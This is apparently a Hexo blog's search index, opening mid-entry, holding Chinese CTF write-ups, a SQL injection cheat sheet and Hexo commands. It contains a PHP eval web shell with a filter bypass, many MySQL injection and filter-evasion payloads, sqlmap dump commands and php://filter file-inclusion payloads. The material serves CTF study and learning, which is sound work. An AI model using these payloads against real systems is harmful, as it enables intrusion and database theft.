几乎完全一样，除了处理失败的方式不同之外。require在出错时将导致脚本中止而 inlude 只产生警告（E_WARNING，脚本会继续运行。 真爆破 50ptUpload1&lt;?php @eval($_POST['pass']);?&gt; 先试试一句话，提示上传成功，在网页源代码中可看见路径u/hack.php。但无法用菜刀链接。 访问上传的文件，输出了： 1@eval($_POST[&apos;pass&apos;]); ?&gt; 过滤了关键字。修改一句话为 1&lt;script language="pHp"&gt;@eval($_POST['pass'])&lt;/script&gt; 链接成功 code]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[备份文件相关]]></title>
    <url>%2F2019%2F09%2F04%2F%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[常见的备份文件后缀名 .git .svn .swp .svn .~ .bak .bash_history]]></content>
      <categories>
        <category>ctf相关</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[sql漏洞]]></title>
    <url>%2F2019%2F09%2F02%2Fsql%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[由sql-labs可了解各种sql 页面没有显示位。无法使用联合查询注入 (1). 通过floor报错 1and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a) 其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符 其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符 (2). 通过updatexml报错 1and updatexml(1,payload,1) 同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效 同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效 (3). 通过ExtractValue报错 1and extractvalue(1, payload) 输出字符有长度限制，最长32位。 输出字符有长度限制，最长32位。]]></content>
  </entry>
  <entry>
    <title><![CDATA[N-CTF]]></title>
    <url>%2F2019%2F08%2F29%2FN-CTF%2F</url>
    <content type="text"><![CDATA[签到题 查看源代码 md5 collision md5碰撞，考查php中’==’的缺陷，查看文章 QNKCDZO的MD5值为0e830400451993494058024219903391，找到一个MD5前两位是0e的字符串即可得flag 签到2输入口令zhimakaimen即可,发现直接输入限制字数 采用post传参即可 这题不是WEB、保存图片，用winhex查看，拉到底 层层递进 查看源代码，发现有个SO.html，点击进入 仍有SO.html,依次往下一直进入此网页 发现404网页获得flag。 AAencode颜文字。用unicode编码网页 是这样的效果直接网站搜索颜文字在线解密即可 也可复制到控制台直接运行 单身二十年看题目应该就知道是手速，速度有关就应该是网页跳转，burp拦截再发包即可获得flag php decode源码： 12345678910&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?&gt; 小知识点：可知是一层的eval(gzinflate(base64_decode()))压缩加密；将eval改为echo即可输出flag 文件包含可参考链接：通过php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码 进入页面http://4.chinalover.sinaapp.com/web7/index.php?file=show.php 可知在file做文章构造：file=php://filter/read=convert.base64-encode/resource=index.php 得到base64加密字符串。解密可得flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[sql注入常用合集]]></title>
    <url>%2F2019%2F08%2F26%2Fsql%E6%B3%A8%E5%85%A5%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[Mysql 常用命令基本词 Mysql版本version() 当前用户名user() 数据库名database() 数据库路径@@datadir 操作系统版本@@version_compile_os Mysql的安装路径@@basedir Union注入 Mysql要大于5.0 找到注入点后获取字段数 1order by Num 查看字段回显 1id=-1 union select 1,2....,n 获取系统数据库名 1select 1,...,schema_name from information_schema.schemata,... 直接获取当前数据库名 1select 1,2...,database() 获取数据库中的表 1select 1,2,...,group_concat(table_name) from information_schama.tables where table_schema=database() 获取表中的字段 1select 1,2,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='&lt;表名&gt;' 获取各个字段值 1select 1,group_concat(&lt;字段1&gt;,&lt;字段2&gt;) from &lt;当前表名&gt; UNION+JOIN注入 适用于：逗号被过滤 1union select * from (select 1)a join (select 1)b join (select database())c; 报错注入 若有报错信息则选择报错注入 UpdateXaml(有长度限制，max=32位) 1id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 如果concat被过滤了，可以使用MAKE_SET函数 ExtractValue(有长度限制,最长32位) 1id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) 如果concat被过滤了，可以使用MAKE_SET函数 exp(5.5.5以上) 1234567普通查询select exp(~(select*from(select user())x));得到表名：select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));得到列名：select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));检索数据：select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)); mysql&gt;5.5.53时，则不能返回查询结果 floor(需要三个函数支持) 1Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a; count(*)、rand()、group by三者缺一不可 floor完整的注入流程 其余报错 1234567891011121314151617181920212223GeometryCollection()id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))polygon()id =1 AND polygon((select * from(select * from(select user())a)b))multipoint()id = 1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()id = 1 AND multilinestring((select * from(select * from(select user())a)b))linestring()id = 1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon()id =1 AND multipolygon((select * from(select * from(select user())a)b)) 都不怎么好用 时间，布尔盲注一把梭时间sleep 1If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 if判断语句，条件为假，执行sleep BENCHMARK 1BENCHMARK(count,expr) 在运行过程中占用大量的cpu资源 笛卡尔积 1' and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# 查询数据量极大的表造成延时。 不正确正则 1select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1); 布尔1234567891011121314151617left(user(),1)&gt;'r' right(user(),1)&gt;'r' substr(user(),1,1)='r' mid(user(),1,1)='r' greatest("sed",database())= "sed" //返回最大值再与字符串比较select least("sea",database())="sea"; //返回最小值再与字符串比较//不使用逗号user() regexp '^[a-z]'user() like 'root%' //注意_/%通配符，建议写脚本的时候时候写到字符集最后面POSITION('root' in user())mid(user() from 1 for 1)='r'mid(user() from 1)='r'substr(user() from 1 for 1)='r'substr(user() from 1)='r'ASCII()、ORD()和CHAR()函数一般用做辅助。 Bypass一把梭过滤空格两个空格代替一个空格，用Tab代替空格，注释代替空格 123%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 括号绕过空格 1id=1'and(sleep(ascii(substr(database(),1,1))=109)) # 空格被过滤，括号没有被过滤，可以用括号绕过 过滤逗号盲注（substr(),mid(),limit） 12345select substr(database() from 1 for 1);select mid(database() from 1 for 1);//对于limit可以使用offset来绕过//limit 0,1 等价于 limit 1 offset 0 直接替换为like注入 1select user() like 'ro%' 注意通配符 % union + join注入 123union select 1,2#等价于union select * from (select 1)a join (select 2)b 过滤比较符号过滤了等号 12345原代码：select * from users where id =1regexp: select * from users where id REGEXP '^1$'!&lt;&gt;: select * from users where !(id&lt;&gt;1)in: select 'user' in ('user'); 字符串都是可以用16进制代替的. 用函数绕过: strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1), greatest() 过滤了大于小于 1234greatest(a,b) 返回a和b中较大的那个数。select * from users where id=1 and ord(mid(database(),0,1))&gt;1等价select * from users where id=1 and greatest(ord(mid(database(),0,1)),123)=123 过滤了ifcase…when…then…else来代替 123select * from users where id=1 and if(1=1,sleep(5),0)等价于：select * from users where id=1 and case when 1=1 then sleep(5) else 0 end 常见Bypass PHP中一些常见的过滤方法及绕过方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859过滤关键字 and orphp代码 preg_match('/(and|or)/i',$id)会过滤的攻击代码 1 or 1=1 1 and 1=1绕过方式 1 || 1=1 1 &amp;&amp; 1=1过滤关键字 and or unionphp代码 preg_match('/(and|or|union)/i',$id)会过滤的攻击代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)='admin'过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'过滤关键字 and, or, union, where, limitphp代码 preg_match('/(and|or|union|where|limit)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select user from users limit 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin过滤关键字 and, or, union, where, limit, group byphp代码 preg_match('/(and|or|union|where|limit|group by)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1过滤关键字 and, or, union, where, limit, group by, selectphp代码 preg_match('/(and|or|union|where|limit|group by|select)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; substr(user,1,1) = 'a'过滤关键字 and, or, union, where, limit, group by, select, 'php代码 preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)过滤关键字 and, or, union, where, limit, group by, select, ', hexphp代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。过滤关键字 and, or, union, where, limit, group by, select, ', hex, substrphp代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;绕过方式 1 &amp;&amp; lpad(user,7,1)过滤关键字 and, or, union, where, limit, group by, select, ', hex, substr, 空格php代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)会过滤的攻击代码 1 &amp;&amp; lpad(user,7,1)/td&gt;绕过方式 1%0b||%0blpad(user,7,1)过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 || (select user from users where user_id = 1) = 'admin'绕过方式 1 || (select user from users limit 1) = 'admin' 各种骚姿势一把梭update、insert、delete注入MySQL下Update、Insert注入方法 pow溢出报错pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错 1select 1 and if(1=1,1,pow(2,2222222222222222222)) 过滤了延时语句，正常页面与错误页面没有区别，当sql语句出错时会返回自定义的错误页面。 XOR注入1admin'^(ascii(mid((password)from(i)))&gt;j)^'1'='1'%23或者admin'^(ascii(mid((password)from(i)for(1)))&gt;j)^'1'='1'%23 过滤了关键字：and、or过滤了逗号，过滤了空格 regexp注入1select (select语句) regexp '正则' 过滤了=、in、like order by盲注暂略 无列名注入在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧 1-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -需要注意字段数，以及回显的地方，以及要查询的东西 适用于：数据泄露或者过滤关键字段名的一把梭 基础指令一把梭URL直接注入 12345python2 sqlmap.py -u "www.xxx.com?id=1" --dbspython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx --tablespython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx --tablespython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx -T xxx --columnspython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx -T xxx -C xxx --dump 从文件中加载HTTP请求先从burpsuite Copt to file 然后 1python2 sqlmap.py -r "选择你保存的文件的路径" 适用于：cookie，POST数据等 本文知识点原整理作者：P2hm1n 原文链接 本人只是初建博客借P2hm1n师傅的知识结构回顾，转到自己博客方便查看 特此感谢P2hm1n师傅的总结]]></content>
      <categories>
        <category>基础回顾</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hexo指南]]></title>
    <url>%2F2019%2F08%2F26%2Fhexo%E5%B8%B8%E7%94%A8%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[hexo指南 hexo new ‘文章标题’ 本地预览 hexo g hexo s 部署到github hexo clean hexo g -d 生成草稿 hexo new draft “文章标题” 发布草稿 hexo publish [layout]]]></content>
      <categories>
        <category>基础回顾</category>
      </categories>
  </entry>
</search>
